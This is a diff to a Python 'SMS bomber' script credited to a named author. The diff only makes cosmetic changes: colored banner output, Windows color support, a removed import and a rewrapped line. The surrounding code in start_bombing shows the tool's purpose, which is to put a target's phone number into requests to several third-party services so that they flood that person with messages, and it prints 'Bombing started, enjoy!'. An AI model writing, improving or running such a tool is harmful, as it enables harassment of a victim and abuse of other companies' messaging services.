@@ -1,16 +1,19 @@
-import base64
 import json
 import signal
 import sys
 from threading import Thread
 from time import sleep
 import requests
-from colorama import Fore, Style
+from colorama import Fore, Style, init
 
 
 def handler(signum, frame):
     print("Terminating...")
     sys.exit()
+
+
+if sys.platform == 'win32':
+    init(convert=True)
 
 banner = """ 
                                  . . .
@@ -38,7 +41,8 @@ banner = """
                             `--..#####..--'
 \n\nAuthor -> Sarfaraz Mir\n"""
 
-print(banner)
+print(f'{Fore.GREEN}{banner}{Fore.RESET}')
+
 
 def start_bombing(phone_number: str, targets: dict, delay: int):
     print(f"{Fore.GREEN}Bombing started, enjoy!{Style.RESET_ALL}")
@@ -51,7 +55,8 @@ def start_bombing(phone_number: str, targets: dict, delay: int):
     targets["POST"][4]['body_param'] = targets["POST"][4]['body_param'].replace('phone_number', phone_number)
     targets["POST"][5]['body_param']['mobile'] = phone_number
     targets["POST"][6]['body_param']['phone_number'] = phone_number
-    targets["POST"][len(targets["POST"]) - 1]["body_param"] = targets["POST"][len(targets["POST"]) - 1]["body_param"].replace('%{phone_number}%', phone_number)
+    targets["POST"][len(targets["POST"]) - 1]["body_param"] = targets["POST"][len(targets["POST"]) - 1][
+        "body_param"].replace('%{phone_number}%', phone_number)
     # GET requests
     targets["GET"][0]['url'] = targets["GET"][0]['url'].replace('%{phone_number}%', phone_number)
     targets["GET"][1]['url'] = targets["GET"][1]['url'].replace('%{phone_number}%', phone_number)
